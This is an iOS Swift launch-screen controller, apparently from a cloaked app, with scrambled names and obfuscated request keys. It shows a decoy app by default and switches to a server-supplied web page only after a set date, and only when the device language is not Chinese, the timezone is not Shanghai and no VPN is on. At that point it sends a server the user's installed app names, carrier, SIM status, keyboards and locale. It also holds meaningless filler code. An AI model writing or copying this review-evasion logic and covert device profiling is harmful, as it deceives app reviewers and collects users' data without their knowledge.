//
//  VAFLaungchngOnlygesmering.swift
//  VinAdfrCloik
//
//  Created by VinAdfrCloik on 2024/12/2.
//

import UIKit
import SVProgressHUD
import AFNetworking
class VAFLaungchngOnlygesmering: UIViewController {

    override func viewDidLoad() {
        super.viewDidLoad()

        let ourbgColorimg = UIImageView.init(frame: self.view.frame)
        ourbgColorimg.contentMode = .scaleAspectFill
        ourbgColorimg.image = UIImage(named: "vaf_qdy")
        view.addSubview(ourbgColorimg)
        
        


#if DEBUG
        askeringWhereTogininonVAF()
        #else
        if IfConditionDateTimeADDLaunguaADDTimeAreaISALLOKAy() == true  && VAFAkertDinder.reasures.VPNConditionIFConnedcted() == false {
          
            askeringWhereTogininonVAF()
 
        }else{
            normalStatusRuingAppVFA()
        }
        #endif
        
    }
    

    
    private func askeringWhereTogininonVAF()  {
//#if DEBUG
//        let fashionDepathVAF = "/api/index/v2/getDf"
//        let dicPaarrmCSBA: [String: Any] = [
//            "deviceId":VAFAkertDinder.reasures.useridUserWherrVAF,
//            "deviceType": UIDevice.current.localizedModel,
//            "version": "1.1.0",
//            "language":["en"],//VAFAkertDinder.reasures.allLocallaunggesVAF
//            "otherAppNames":VAFAkertDinder.reasures.phoneONAppNammnamesVAF,
//            "useSimCard":1,//1插卡 0没
//            "networkOperator":"",//VAFAkertDinder.reasures.yysNameVAF,
//            "timezone":"japen",//TimeZone.current.identifier,
//            "keyboards":["en-US"],//VAFAkertDinder.reasures.allKeyBoardlaunggesVAF,
//            "useVpn":VAFAkertDinder.reasures.VPNConditionIFConnedcted() == true ? 1 : 0
//        ]
//        
//        #else
        let fashionDepathVAF = "/ativityIn/husiasts/iscoveries/styles"
//        let dicPaarrmCSBA: [String: Any] = [
//            "tare":VAFAkertDinder.reasures.useridUserWherrVAF ,
//            "those": UIDevice.current.localizedModel,
//            "ahand": Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "1.1",
//            "variety":["en"],
//            "ngleitem":VAFAkertDinder.reasures.phoneONAppNammnamesVAF,
//            "garde":1,//1插卡 0没
//            "namored":"VAFAkertDinder.reasures.yysNameVAF",
//            "creativit":"tokey",
//            "forum":["en-US"],
//            "behind": 0
//        ]
        let dicPaarrmCSBA: [String: Any] = [
            "tare":VAFAkertDinder.reasures.useridUserWherrVAF ,
            "those": UIDevice.current.localizedModel,
            "ahand": Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "1.1",
            "variety":VAFAkertDinder.reasures.allLocallaunggesVAF,
            "ngleitem":VAFAkertDinder.reasures.phoneONAppNammnamesVAF,
            "garde":VAFAkertDinder.reasures.isExsitSMCardVAF,//1插卡 0没
            "namored":VAFAkertDinder.reasures.yysNameVAF,
            "creativit":TimeZone.current.identifier,
            "forum":VAFAkertDinder.reasures.allKeyBoardlaunggesVAF,
            "behind":VAFAkertDinder.reasures.VPNConditionIFConnedcted() == true ? 1 : 0
        ]
//#endif
        SVProgressHUD.show()

        VAFAkertDinder.reasures.postNetingwortkonhVAF( fashionDepathVAF, parmaamVAF: dicPaarrmCSBA) { result in
            
            switch result{
            case .success(let data):
                guard let datMying = data else{
                    self.normalStatusRuingAppVFA()
                    return
                }
                
                
               
                
                let linkergeing = datMying["h5Url"] as? String
                
                let logFloggeting = datMying["loginFlag"] as? Int ?? 0
                
                UserDefaults.standard.set(linkergeing, forKey: "savedLinkertVAF")
                
                if logFloggeting == 1 {
                    
                    guard let saveusertokenVAF = UserDefaults.standard.object(forKey: "logintokkenVAF") as? String,
                          let linerccVAF = linkergeing else{
                        
                        self.togoLaungingGoAgain()
                        return
                    }
                    
                    let recordPathVAF = linerccVAF  + "/?appId=\(VAFAkertDinder.reasures.appYUonluIDVAF)&token=" + saveusertokenVAF
                    ((UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = VAFenterinContenesmering.init(wonderfulnowing: recordPathVAF, islogingpagepalt: false)
                    return
                }
                
                if logFloggeting == 0 {
                    self.togoLaungingGoAgain()
                }
                
                
                
            case .failure(let error):
                if let error = error as NSError?, error.domain == NSURLErrorDomain {
                    if error.code == NSURLErrorNotConnectedToInternet {
                        let alertvCAB = UIAlertController.init(title: "Network is error", message: "Check your network settings and try again", preferredStyle: .alert)
                        let acsslertg = UIAlertAction(title: "Try again", style: UIAlertAction.Style.default){_ in
                            self.askeringWhereTogininonVAF()
                        }
                        alertvCAB.addAction(acsslertg)
                        self.present(alertvCAB, animated: true)
                        
                        return
                    }
                    
                    self.normalStatusRuingAppVFA()
                    
                }else{
                    self.normalStatusRuingAppVFA()
                }
                
                
            }
            
        }
       
    }
    
    
    private func togoLaungingGoAgain()  {
     
        let guideBuuy = UINavigationController.init(rootViewController: VAFLaungchngLogEmailgesmering.init())
        guideBuuy.navigationBar.isHidden = true
        ((UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = guideBuuy
    }
    
    func normalStatusRuingAppVFA(){
        if VAFTrendyLoadding.reasures.ifVAFLogEnter.0 == false {
            var skillsVAF = "Brilliant Colors  Carefully Selected Items"
            skillsVAF.removeLast()
            var stirnNewVAF = String(skillsVAF.suffix(4))
            if stirnNewVAF.contains("Bri") {
                stirnNewVAF.append(skillsVAF)
            }else{
                stirnNewVAF.append("Carefully")
            }

            var mindedVAF = [String: Int]()
            let wordArrayVAF = skillsVAF.components(separatedBy: " ")


            for (ret,word) in wordArrayVAF.enumerated() {
                if let count = mindedVAF[word] {
                    mindedVAF[word] = count + ret
                } else {
                    mindedVAF[word] = 1
                }
            }

            if mindedVAF.keys.count > 2 {
                let rootNAvifvc = UINavigationController(rootViewController: VAFLogChoiceTernaler())
                rootNAvifvc.navigationBar.isHidden = true
                ((UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = rootNAvifvc
            }else{
                let rootNAvifvc = UINavigationController(rootViewController: VAFLogChoiceTernaler())
                rootNAvifvc.navigationBar.isHidden = true
                ((UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = rootNAvifvc
            }
           
        }else{
            let hearWantageVAf = ["VAFMyineMessageID":99]
            VAFTrendyLoadding.reasures.setupGivenVAFUser(interfacetChar: hearWantageVAf)
            let rootNAvifvc = UINavigationController(rootViewController: VAFMainContainerTernaler())
            rootNAvifvc.navigationBar.isHidden = true
            ((UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = rootNAvifvc
           
        }
    }
}
extension VAFLaungchngOnlygesmering {

     
    
    func IfConditionDateTimeADDLaunguaADDTimeAreaISALLOKAy() -> Bool {
        if checkkingTimertIsOKAyCABA() == true && checkkingLocalFirstLaungeABA() == false && checkkingAREATIMErtIsOKAyCABA() == false{
            return true
        }
        return false
    }
    
    private  func checkkingLocalFirstLaungeABA()->Bool{
         
      
        if  Locale.preferredLanguages.first?.hasPrefix("zh") == true {
            return true
        }
        return false
    }
    

    private func checkkingAREATIMErtIsOKAyCABA()->Bool{
      
        return TimeZone.current.identifier == "Asia/Shanghai"
    }

    
    private  func checkkingTimertIsOKAyCABA()->Bool{
    
        if let targetyCABDate = Calendar.current.date(from: DateComponents(year: 2024, month: 11, day:23,hour: 0)) {
            if Date() > targetyCABDate {
                return true
            }else{
                return false
            }
        }
        
        return false

   }
}
